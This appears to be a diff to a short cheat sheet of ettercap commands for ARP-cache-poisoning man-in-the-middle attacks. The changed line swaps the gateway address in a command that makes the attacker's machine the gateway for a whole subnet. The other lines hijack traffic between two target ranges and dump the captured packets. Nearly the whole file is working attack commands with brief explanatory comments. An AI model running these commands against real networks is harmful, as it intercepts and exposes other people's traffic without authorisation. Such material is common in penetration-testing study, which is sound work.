@@ -6,7 +6,7 @@ ettercap -Tq -I
 ettercap -Tq -i eth0 -M arp:remote /target-range1/ /target-range2/ 
 # The packets between target-range1 and target-range will be hijacked and they will be going through our machine (magic of arp-cache-poisoning)
 
-ettercap -Tq -i eth0 -M arp:remote /192.168.1.1/ //
+ettercap -Tq -i eth0 -M arp:remote /172.16.0.1//
 # Become the gateway for all machines in a subnet
 
 ettercap -Tq -L dump -i eth0
